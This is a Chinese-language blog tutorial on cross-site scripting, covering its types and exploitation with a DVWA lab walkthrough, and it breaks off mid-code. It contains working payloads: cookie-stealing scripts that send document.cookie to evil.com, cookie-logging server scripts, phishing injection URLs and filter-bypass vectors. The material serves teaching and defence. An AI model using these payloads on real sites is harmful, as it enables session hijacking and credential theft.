      <url>/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。</p><a id="more"></a><h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="1-1-XSS简介"><a href="#1-1-XSS简介" class="headerlink" title="1.1 XSS简介"></a>1.1 XSS简介</h3><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序<strong>对用户的输入过滤不足</strong>而产生的。攻击者利用网站漏洞把<strong>恶意的脚本代码注入</strong>到网页中，当<strong>其他用户</strong>浏览这些网页时，就会<strong>执行其中的恶意代码</strong>，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 </p><p> <strong>关键点：</strong> </p><p>目标网站的目标用户</p><ul><li>浏览器</li><li>不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时<strong>被浏览器解析执行</strong></li><li>“跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。</li></ul><p><strong>总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行</strong></p><h3 id="1-2-XSS分类"><a href="#1-2-XSS分类" class="headerlink" title="1.2 XSS分类"></a>1.2 XSS分类</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><ul><li><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p></li><li><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p></li><li><p>服务器端代码： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  可以看到，代码直接引用了 <code>name</code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 </p></li></ul><h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><ul><li><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p></li><li><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p></li><li><p>服务器端代码： </p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close(); &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 </p></li></ul><h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><ul><li><p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 </p></li><li><p>HTML 代码： </p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM-XSS test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> a=<span class="built_in">document</span>.URL;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.write(a.substring(a.indexOf(<span class="string">"a="</span>)+<span class="number">2</span>,a.length));</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   将代码保存在 domXSS.html 中，浏览器访问： </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>  DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</p></li></ul><h3 id="1-3-XSS-利用方式"><a href="#1-3-XSS-利用方式" class="headerlink" title="1.3 XSS 利用方式"></a>1.3 XSS 利用方式</h3><h4 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h4><ul><li><p>攻击者可以使用以下代码获取客户端的 Cookies 信息 ：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.location=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://www.evil.com/cookie.asp?cookie="</span>+<span class="built_in">document</span>.cookie</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src="http:/</span><span class="regexp">/www.evil.com/</span>cookie.asp?cookie=<span class="string">"+document.cookie&gt;&lt;/img&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs&#x3D;nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($log, $cookie . <span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 </p><h4 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h4></li><li><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。<strong>会话劫持的本质</strong>是在攻击中带上了 Cookies 并发送到了服务端。</p></li><li><p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到<strong>提升权限</strong>的目的。 </p></li><li><p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 </p></li></ul><h4 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h4><ul><li><p>重定向钓鱼</p><p>把当前页面重定向到一个钓鱼页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTML 注入式钓鱼</p><p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p> 该段代码会在正常页面中嵌入一个 Form 表单。 </p></li><li><p>iframe 钓鱼 </p><p>这种方式是通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>Flash 钓鱼 </p><p>将构造好的 Flash 文件传入服务器，在目标网站用 <code>&lt;object&gt;  或   &lt;embed&gt;</code> 标签引用即可。 </p></li><li><p>高级钓鱼技术 </p><p> 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 </p></li></ul><h4 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h4><p> 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用  <code>&lt;iframe&gt;</code>  标签 </p><h4 id="DOS-与-DDOS¶"><a href="#DOS-与-DDOS¶" class="headerlink" title="DOS 与 DDOS¶"></a>DOS 与 DDOS<a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#dos-ddos" target="_blank" rel="noopener">¶</a></h4><p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p><h4 id="XSS-蠕虫-¶"><a href="#XSS-蠕虫-¶" class="headerlink" title="XSS 蠕虫 ¶"></a>XSS 蠕虫 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#xss_4" target="_blank" rel="noopener">¶</a></h4><p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p><h4 id="Self-XSS-变废为宝的场景-¶"><a href="#Self-XSS-变废为宝的场景-¶" class="headerlink" title="Self-XSS 变废为宝的场景 ¶"></a>Self-XSS 变废为宝的场景 <a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#self-xss" target="_blank" rel="noopener">¶</a></h4><p>Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。</p><ul><li>登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录</li></ul><p>这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作：</p><ol><li>恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload</li><li>JavaScript Payload 生成  <code>&lt;iframe&gt;</code>  标签，并在框架内执行以下这些操作</li><li>让受害者登出攻击者的账号</li><li>然后使得受害者通过 CSRF 登录到自己的账户个人信息界面</li><li>攻击者从页面提取 CSRF Token</li><li>然后可以使用 CSRF Token 提交修改用户的个人信息</li></ol><p>这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；<strong>X-Frame-Options</strong> 需要被设置为同源（该页面可以在相同域名页面的 <code>iframe</code> 中展示 ）</p><ul><li><p>登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证</p></li><li><p>让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面</p></li><li><p>让用户登录我们的账户页面出现 XSS，利用 使用   <code>&lt;iframe&gt;</code>  标签等执行恶意代码</p></li><li><p>登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session</p></li></ul><h3 id="1-4-正则表达式规则"><a href="#1-4-正则表达式规则" class="headerlink" title="1.4 正则表达式规则"></a>1.4 正则表达式规则</h3><p> 以一个网上商城应用 <a href="https://magento.com/" target="_blank" rel="noopener">Magento</a> 中的过滤类 <a href="https://github.com/nexcess/magento/blob/master/app/code/core/Mage/Core/Model/Input/Filter/MaliciousCode.php" target="_blank" rel="noopener">Mage_Core_Model_Input_Filter_MaliciousCode</a> 为例，部分代码如下： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $_expressions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'/(\/\*.*\*\/)/Us'</span>,</span><br><span class="line">    <span class="string">'/(\t)/'</span>,</span><br><span class="line">    <span class="string">'/(javascript\s*:)/Usi'</span>,</span><br><span class="line">    <span class="string">'/(@import)/Usi'</span>,</span><br><span class="line">    <span class="string">'/style=[^&lt;]*((expression\s*?\([^&lt;]*?\))|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/&lt;\/?(script|meta|link|frame|iframe).*&gt;/Uis'</span>,</span><br><span class="line">    <span class="string">'/src=[^&lt;]*base64[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;_expressions, <span class="string">''</span>, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 <code>&lt;script&gt;foo&lt;/script&gt;</code> 时，两个标签都会被移除而只剩下 foo。</p><h2 id="0x02-简单实例分析"><a href="#0x02-简单实例分析" class="headerlink" title="0x02 简单实例分析"></a>0x02 简单实例分析</h2><p>以下三个类型的实例，环境为DVWA平台，系统为windows</p><h3 id="2-1-反射型XSS-Low等级"><a href="#2-1-反射型XSS-Low等级" class="headerlink" title="2.1 反射型XSS-Low等级"></a>2.1 反射型XSS-Low等级</h3><ul><li><strong>先利用alert测试是否存在xss</strong> </li></ul><p>  <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss01.png" alt=""></p><p>出现弹窗，说明存在xss漏洞</p><ul><li><p>源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞</p></li><li><p><strong>编写PHP文档获取页面的cookie：</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>编写js代码将页面的cookie发送到cookie.php中</strong> </p><p>当在火狐浏览器中在，以下位置输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>并点击提交，页面跳转，说明执行了js代码</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss03.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>跳转至下页面，并打开cookie.txt</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss04.png" alt=""></p></li><li><p><strong>如上图，表示成功拿到cookie</strong>，也就可以通过cookie登陆dvwa</p></li><li><p>js代码分析： document.location</p><p> <strong>[document 对象]</strong> :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 </p><p> <strong>document.location</strong> 包含 href 属性，直接取值赋值时相当于 document.location.href。<br>document.location.href 当前页面完整 URL </p></li></ul><h3 id="2-2-反射型XSS-Medium等级"><a href="#2-2-反射型XSS-Medium等级" class="headerlink" title="2.2 反射型XSS-Medium等级"></a>2.2 反射型XSS-Medium等级</h3><ul><li><p><strong>先利用alert进行弹窗测试</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss05.png" alt=""></p><p><strong>发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·<code>&lt;script&gt;</code>标签关键字，但是只过滤一次，所以可以想办法绕过</strong> </p></li><li><p>绕过1： 通过构造两个标签，即嵌套</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss06.png" alt=""></p><p> <strong>出现弹窗，说明存xss</strong> </p></li><li><p>绕过2：<strong>也可以大小写混写进行绕过</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss07.png" alt=""></p><p><strong>出现弹窗，说明存在xss</strong> </p></li><li><p><strong>然后利用js代码获取cookie,成功拿到cookie</strong> </p></li><li><p>源代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>str_replace()对<code>&lt;script&gt;</code>进行了过滤‘</li></ul></li></ul><h3 id="2-3-反射型XSS-High等级"><a href="#2-3-反射型XSS-High等级" class="headerlink" title="2.3 反射型XSS-High等级"></a>2.3 反射型XSS-High等级</h3><ul><li><p><strong>还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。</strong> </p></li><li><p><strong>接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML）</strong> </p></li><li><p>Img：<code>&lt;img src=x onerror=alert(1)&gt;</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss02.png" alt=""></p><ul><li><p>Iframe: <code>&lt;iframe onload=alert(1)&gt;</code> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss08.png" alt=""></p></li><li><p><strong>两个都成功的出现弹窗</strong> </p></li><li><p>源代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>利用preg_replace()正则表达过滤掉所有形式的<code>&lt;script&gt;</code></li></ul></li><li><p>观察下面反射型xss-impossible等级代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Is there any input?</span></span><br><span class="line">  <span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello 